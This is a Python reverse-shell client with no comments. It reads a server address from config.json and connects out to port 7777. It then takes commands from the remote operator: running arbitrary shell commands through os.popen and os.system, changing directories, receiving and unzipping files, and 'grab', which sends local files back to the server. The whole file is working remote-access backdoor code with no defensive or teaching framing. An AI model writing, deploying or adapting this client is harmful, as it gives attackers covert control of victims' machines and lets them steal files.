import os
import socket
import struct
import json
from zipfile import ZipFile

try:
    with open('config.json') as file:
        config = json.load(file)
except:
    exit(1)
buffer_size = 1024 * 4

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((config['server-ip'], 7777))
    cwd = os.getcwd()
    s.sendall(struct.pack('>I', len(cwd.encode())) + cwd.encode())
    while True:
        command_len = struct.unpack('>I', s.recv(4))[0]
        command = s.recv(command_len).decode()
        split_command = command.split()
        if command == 'QUIT':
            s.close()
            break
        if split_command[0].lower() == 'cd':
            try:
                os.chdir(' '.join(split_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        elif split_command[0].lower() == 'tfile':
            file_name = split_command[1]
            file_size = struct.unpack('>Q', s.recv(8))[0]

            with open(file_name, 'wb') as file:
                remaining_size = file_size
                while remaining_size > 0:
                    data_size = min(buffer_size, remaining_size)
                    data = s.recv(data_size)
                    if not data:
                        break
                    file.write(data)
                    remaining_size -= len(data)
                file.close()
            output = f'Successfully Transferred {file_name}'
        elif split_command[0] == 'unzip':
            file_name = split_command[1]
            src = os.getcwd()
            target_dir = file_name.rsplit('.', 1)[0]

            if not os.path.exists(target_dir):
                os.makedirs(target_dir)

            with ZipFile(file_name, 'r') as zip:
                zip.extractall(target_dir)
            output = f'Unzipped {file_name} Successfully!'
        elif split_command[0] == 'start':
            os.system(command)
            output = f'Successfully Started {split_command[1]}'
        elif split_command[0] == 'grab':
            file_path = split_command[1]
            file_name = os.path.basename(file_path)
            file_size = os.path.getsize(file_name)
            print(file_name)
            s.sendall(struct.pack('>Q', file_size))
            with open(file_name, 'rb') as file:
                data = file.read(buffer_size)
                while data:
                    s.sendall(data)
                    data = file.read(buffer_size)
                    data_size = len(data)
            output = f'Successfully Grabbed {file_name}'
        else:
            output = os.popen(command).read()
        output = output.encode()
        cwd = os.getcwd().encode()
        s.sendall(struct.pack('>I', len(output)) + output)
        s.sendall(struct.pack('>I', len(cwd)) + cwd)
    s.close()

